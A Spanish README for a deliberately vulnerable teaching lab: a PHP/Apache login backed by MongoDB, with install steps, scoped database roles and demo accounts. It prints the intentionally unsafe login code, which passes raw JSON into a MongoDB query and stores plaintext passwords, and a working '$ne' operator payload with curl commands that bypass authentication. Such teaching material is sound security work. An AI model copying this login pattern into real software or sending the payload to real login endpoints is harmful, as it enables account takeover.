# NoSQL Injection Lab — PHP, Apache y MongoDB

Aplicación académica para Debian 12/13. Contiene una vulnerabilidad intencionada de **NoSQL Injection** en la consulta real de autenticación y utiliza cuentas y roles reales de MongoDB para limitar las lecturas por colección.

> **Solo laboratorio aislado.** Las contraseñas de las cuentas web de demostración se guardan en texto claro intencionadamente para poder demostrar el filtro `$ne`. No uses este diseño, estas credenciales ni datos reales en producción. No publiques TCP/27017 ni la web vulnerable en Internet.

## 1. Arquitectura y permisos

La arquitectura distingue dos conexiones:

```text
Navegador de otro equipo ──HTTP/80──> Apache + PHP en la VM
                                           │
                                           ├── login: 127.0.0.1:27017 como cuenta técnica
                                           │   permiso MongoDB: find solo en web_users
                                           │
                                           └── documentos: 127.0.0.1:27017 como cuenta MongoDB
                                               propia del usuario de la sesión
                                               ana   -> find solo en pedidos_ana
                                               bruno -> find solo en inventario_bruno
                                               carla -> find solo en incidencias_carla

Cliente administrador ──TCP/27017──> 172.16.0.133:27017 (usuario administrativo MongoDB)
```

MongoDB escucha en loopback para PHP y en la IP LAN para administración remota. No hay que elegir entre una cosa y la otra. El instalador conserva la IP LAN detectada y añade `127.0.0.1` a `net.bindIp`.

Si la autorización estaba desactivada, el instalador genera una cuenta administrativa aleatoria y habilita `security.authorization` para que MongoDB aplique de verdad los roles. Se guarda una copia de la configuración previa en `*.pre-nosql-injection-lab`. Esto puede afectar a otros clientes que se conectasen sin credenciales: desde ese momento deberán autenticarse. Si la autorización ya estaba activa, el instalador respeta el modo existente y pide una URI administrativa válida.

La aplicación usa una cuenta técnica exclusivamente para consultar `web_users`. El resultado del filtro vulnerable determina la identidad de la sesión; a continuación, PHP selecciona la URI privada de esa identidad para leer documentos. Aunque se alterase una petición HTTP, el rol de MongoDB también impide a la cuenta de Ana leer las colecciones de Bruno o Carla.

## 2. Requisitos

- Debian 12 o 13 en una VM.
- MongoDB ya instalado, en ejecución y con `mongosh` disponible.
- Una IPv4 LAN para la administración remota; en el escenario de ejemplo es `172.16.0.133`.
- Privilegios `root`/`sudo`.
- Conectividad LAN desde el equipo administrador al puerto TCP/27017 y desde el navegador al puerto TCP/80.

No instala otra base de datos ni usa Docker, LXC o Kubernetes. Instala Apache2, PHP, Composer y las dependencias necesarias. Utiliza la extensión `mongodb` de la rama 1.21.x y la librería oficial `mongodb/mongodb` de Composer.

## 3. Instalación automática

Extrae el ZIP y ejecuta desde la raíz del proyecto:

```bash
sudo bash install.sh
```

El instalador:

1. Comprueba Debian, `mongosh` y el servicio MongoDB existente.
2. Hace copia de seguridad de `mongod.conf`, conserva la dirección LAN de MongoDB y añade loopback para PHP.
3. Detecta si MongoDB requiere autenticación. Si no la requiere, crea un administrador aleatorio y activa la autorización; si ya está activa, pide una URI administrativa existente (o reutiliza la cuenta que creó en una instalación anterior).
4. Instala Apache, PHP, la extensión del driver, Composer y dependencias.
5. Crea o actualiza `nosql_lab`, las semillas ficticias, un usuario técnico de login y tres cuentas MongoDB con roles específicos por colección.
6. Genera la configuración privada, instala Composer, configura Apache y ejecuta comprobaciones de conexión y roles.

La instalación requiere una cuenta MongoDB con privilegios para consultar usuarios y crear/actualizar roles y usuarios. Para una instalación que ya tenía autorización activa, un ejemplo de URI es:

```text
mongodb://ADMIN:CONTRASENA@127.0.0.1:27017/admin?authSource=admin
```

Adapta el usuario, la contraseña y `authSource` a la cuenta que ya exista. La URI introducida manualmente no se guarda en la configuración PHP. No la pongas en una orden de shell que acabe guardada en el historial.

Si el instalador detecta autorización desactivada, habilitarla hará que clientes que antes accedían sin credenciales tengan que autenticarse. La copia previa queda junto al archivo original. La cuenta administrativa generada se guarda con permisos `0600` en `/root/.nosql-injection-lab-admin.env`; léela con:

```bash
sudo cat /root/.nosql-injection-lab-admin.env
```

El archivo incluye `ADMIN_USER` y `ADMIN_PASSWORD`. Para conectarte remotamente con Compass u otro cliente, utiliza la IP LAN de la VM, el puerto `27017` y `authSource=admin`, por ejemplo:

```text
mongodb://USUARIO:CONTRASENA@172.16.0.133:27017/admin?authSource=admin
```

Sustituye los marcadores por los valores reales. Si MongoDB ya tenía autenticación y usas una cuenta administrativa preexistente, utiliza sus credenciales en la URI y cambia únicamente el host por `172.16.0.133` para conectar desde otro equipo.

**Red:** el instalador no altera reglas de firewall ajenas. Si hay firewall, permite TCP/27017 solamente desde la IP o subred de los administradores y TCP/80 desde la red de usuarios. No expongas MongoDB a Internet.

### Si ya habías ejecutado una versión anterior del instalador

Si una versión anterior se detuvo después de activar `security.authorization` con un mensaje indicando que no pudo verificar el administrador, la VM puede haber quedado con autenticación activada y la web sin instalar. **No borres la base de datos ni restaures todo `mongod.conf` a ciegas.** Esta versión nueva mejora esa recuperación:

1. Conserva `127.0.0.1` para PHP y la IP LAN para la administración.
2. Comprueba las credenciales guardadas en `/root/.nosql-injection-lab-admin.env` y muestra el diagnóstico real de `mongosh` si fallan.
3. Si la copia previa demuestra que el laboratorio partió sin autorización, ofrece reparar la cuenta administrativa generada. Si aceptas, desactiva temporalmente la autorización, actualiza esa cuenta, vuelve a activarla y verifica el acceso antes de continuar con la instalación.

Durante la reparación, MongoDB se queda temporalmente sin autenticación, pero el instalador lo restringe a `127.0.0.1` antes del reinicio. La administración remota por TCP/27017 se interrumpe durante unos segundos; los equipos de la LAN no pueden conectarse a MongoDB en esa ventana. Después se restaura la configuración anterior, con autenticación y la IP LAN, y se verifica la cuenta. No se borran bases de datos ni colecciones. Si no aceptas la reparación, el instalador solo podrá continuar si proporcionas una URI administrativa existente y válida.

Para pasar esta versión a la VM, extrae el ZIP nuevo sobre un directorio de proyecto nuevo (o sustituye los archivos del proyecto), y ejecuta desde su raíz `sudo bash install.sh`. No hace falta volver a compilar manualmente la extensión PHP; el instalador la comprueba.

## 4. Archivos y rutas

```text
nosql-injection-lab/
├── install.sh
├── README.md
├── composer.json
├── config/config.example.php
├── scripts/
│   ├── mongodb_config.py
│   ├── setup_db.js
│   ├── check_mongo.php
│   ├── check_mongodb_roles.php
│   ├── test_injection.sh
│   └── reset_lab_data.sh
└── public/
    ├── index.php
    ├── assets/style.css
    ├── assets/app.js
    └── api/
        ├── _common.php
        ├── login.php
        ├── logout.php
        ├── collections.php
        └── documents.php
```

El instalador copia el proyecto a `/opt/nosql-injection-lab` y configura:

- `/opt/nosql-injection-lab/public/`: raíz pública Apache.
- `/opt/nosql-injection-lab/vendor/`: dependencias Composer, fuera del DocumentRoot.
- `/etc/nosql-injection-lab/config.php`: URIs privadas de la cuenta técnica y de las cuentas individuales; accesible solo por root y `www-data`.
- `/etc/nosql-injection-lab/installer.env`: nombres, roles y contraseñas aleatorias de las cuentas MongoDB, solo root.
- `/etc/apache2/sites-available/000-00-nosql-injection-lab.conf`: VirtualHost.
- `/etc/mongod.conf.pre-nosql-injection-lab` (o la ruta correspondiente): copia previa de la configuración de MongoDB.
- `/var/log/apache2/nosql-injection-lab-error.log` y `nosql-injection-lab-access.log`: logs.

El instalador conserva datos ajenos: no elimina bases de datos ni colecciones. Las semillas identificadas por sus claves se reemplazan de forma idempotente.

## 5. Usuarios web de laboratorio

| Usuario web | Contraseña ficticia | Colección visible |
|---|---|---|
| `ana` | `AnaDemo2026!` | `pedidos_ana` |
| `bruno` | `BrunoDemo2026!` | `inventario_bruno` |
| `carla` | `CarlaDemo2026!` | `incidencias_carla` |

`nosql_lab` contiene `web_users`, `pedidos_ana`, `inventario_bruno` e `incidencias_carla`. Cada colección de datos tiene documentos ficticios.

Las contraseñas web no son las contraseñas de MongoDB. Las credenciales MongoDB por usuario se generan aleatoriamente y se guardan en configuración privada; los roles de base de datos son efectivos:

- La cuenta técnica del login solo puede hacer `find` sobre `web_users`.
- La cuenta de Ana solo puede hacer `find` sobre `pedidos_ana`.
- La cuenta de Bruno solo puede hacer `find` sobre `inventario_bruno`.
- La cuenta de Carla solo puede hacer `find` sobre `incidencias_carla`.

## 6. Acceso desde otros equipos

La web se abre desde un navegador de la red en:

```text
http://172.16.0.133/
```

Utiliza la dirección LAN que indique el instalador si es diferente. Los usuarios de la web no conectan a MongoDB directamente: Apache/PHP consulta `127.0.0.1:27017`.

Para administrar MongoDB remotamente, el cliente de administración se conecta a:

```text
172.16.0.133:27017
```

con autenticación MongoDB activa. Comprueba en la VM:

```bash
sudo ss -lntp | grep ':27017'
```

Deben verse la interfaz loopback y la interfaz LAN (o una dirección comodín ya configurada). Si no puedes conectar desde fuera, comprueba el modo de red de la VM, la ruta de red y el firewall. No cambies `bindIp` a solo `127.0.0.1` si necesitas administración remota.

## 7. Funcionamiento normal de la web

1. Abre `http://172.16.0.133/` desde otro equipo.
2. Inicia sesión con una de las tres cuentas ficticias.
3. El endpoint `POST /api/login.php` consulta MongoDB y crea una sesión PHP.
4. La página muestra la colección asignada a la identidad obtenida.
5. Al consultar documentos, PHP vuelve a comprobar el permiso y MongoDB ejecuta la consulta con la cuenta del usuario web, cuyos roles impiden leer colecciones ajenas.
6. **Cerrar sesión** elimina la sesión.

Los documentos se insertan en el DOM mediante `textContent`, se limita la cantidad devuelta por petición y los errores internos no se muestran al cliente.

## 8. Demostración real de NoSQL Injection con `$ne`

La vulnerabilidad se encuentra en la consulta real de `public/api/login.php`. El cuerpo JSON se decodifica conservando el objeto anidado y se construye el filtro con los valores recibidos:

```php
$filter = [
    'username' => $data['username'],
    'password' => $data['password'],
];
$user = $users->findOne($filter);
```

No se convierte el campo `password` en una cadena ni se eliminan operadores. Una carga como `{"$ne":"x"}` se serializa como documento BSON y MongoDB la evalúa como operador. El documento devuelto por esa misma consulta determina la identidad de la sesión; no se hace una comprobación posterior con `password_verify()`.

### Intento fallido

```bash
curl -i \
  -H 'Content-Type: application/json' \
  --data '{"username":"ana","password":"incorrecta"}' \
  http://172.16.0.133/api/login.php
```

Resultado esperado: HTTP `401` y `"ok":false`.

### Login legítimo

```bash
curl -i -c /tmp/nosql-ana.cookies \
  -H 'Content-Type: application/json' \
  --data '{"username":"ana","password":"AnaDemo2026!"}' \
  http://172.16.0.133/api/login.php
```

Resultado esperado: HTTP `200`, `"ok":true` y `user.username` igual a `ana`.

### Payload `$ne`

Desde el navegador, abre F12, selecciona **Red/Network**, realiza un intento de login y localiza `POST /api/login.php`. Reenvía la petición con `Content-Type: application/json` y este cuerpo:

```json
{
  "username": "ana",
  "password": {
    "$ne": "NO_ES_LA_CONTRASENA_CORRECTA"
  }
}
```

En navegadores basados en Chromium puedes usar «Copiar como fetch» y pegar la petición en Console cambiando el cuerpo JSON, o usar «Editar y reenviar» si está disponible. El resultado esperado es HTTP `200`, `"ok":true` y `user.username` igual a `ana`. La interfaz debe mostrar `pedidos_ana` y los documentos de esa colección.

Reproducción por terminal:

```bash
curl -i -c /tmp/nosql-injection.cookies \
  -H 'Content-Type: application/json' \
  --data '{"username":"ana","password":{"$ne":"NO_ES_LA_CONTRASENA_CORRECTA"}}' \
  http://172.16.0.133/api/login.php

curl -i -b /tmp/nosql-injection.cookies \
  http://172.16.0.133/api/collections.php

curl -i -b /tmp/nosql-injection.cookies \
  'http://172.16.0.133/api/documents.php?collection=pedidos_ana'
```

La primera petición debe establecer sesión como `ana`, la segunda devolver únicamente `pedidos_ana` y la tercera devolver documentos reales. Comprueba además que una petición con la cookie de Ana a `documents.php?collection=inventario_bruno` recibe HTTP `403`. Aunque PHP tiene esa comprobación, el rol de MongoDB de Ana también deniega una consulta directa a la colección de Bruno.

## 9. Pruebas automáticas

Desde la VM:

```bash
sudo bash /opt/nosql-injection-lab/scripts/test_injection.sh
```

La prueba verifica que la extensión y Composer están disponibles, que PHP consulta MongoDB, que Apache responde, que las API rechazan sesiones anónimas, que las tres contraseñas legítimas funcionan, que una contraseña incorrecta falla, que `$ne` autentica realmente como Ana, que esa sesión consulta documentos y que la API bloquea el acceso cruzado.

Los roles de MongoDB se verifican por separado y también desde el script de pruebas:

```bash
sudo php /opt/nosql-injection-lab/scripts/check_mongo.php
sudo php /opt/nosql-injection-lab/scripts/check_mongodb_roles.php
```

`check_mongodb_roles.php` prueba que cada cuenta puede leer su colección, que MongoDB deniega las otras dos colecciones y que la cuenta técnica del login no puede leer datos de negocio. Si algo no cumple las expectativas, los scripts terminan con código distinto de cero.

Desde otro equipo puede probarse la API por HTTP con:

```bash
BASE_URL='http://172.16.0.133' bash scripts/test_injection.sh
```

## 10. Logs y solución de problemas

```bash
sudo systemctl status mongod --no-pager
sudo systemctl status apache2 --no-pager
sudo journalctl -u mongod -n 100 --no-pager
sudo tail -n 100 /var/log/apache2/nosql-injection-lab-error.log
sudo tail -n 100 /var/log/apache2/nosql-injection-lab-access.log
sudo php /opt/nosql-injection-lab/scripts/check_mongo.php
sudo php /opt/nosql-injection-lab/scripts/check_mongodb_roles.php
sudo ss -lntp | grep -E ':(80|27017)\b'
```

Si MongoDB usa el nombre de servicio `mongodb`, sustituye `mongod` en los comandos de servicio.

## 11. Restauración explícita y parada

Para restaurar los documentos de semillas y las cuentas web del laboratorio sin eliminar la base de datos ni las colecciones completas:

```bash
sudo bash /opt/nosql-injection-lab/scripts/reset_lab_data.sh
```

Debes confirmar escribiendo `RESET-NOSQL-LAB`. El script vuelve a aplicar los roles y las semillas idempotentes conocidas. No borra documentos ajenos a las semillas.

Para detener o arrancar la web:

```bash
sudo systemctl stop apache2
sudo systemctl start apache2
```

## 12. Riesgo deliberado

Esta aplicación es vulnerable intencionadamente a NoSQL Injection en el inicio de sesión y utiliza contraseñas web de demostración en texto claro. En una aplicación real debe validarse estrictamente el esquema de entrada, construir filtros exclusivamente desde campos permitidos y comparar hashes de contraseñas. Aquí la vulnerabilidad está en el flujo de autenticación real porque ese es el objeto de la práctica.
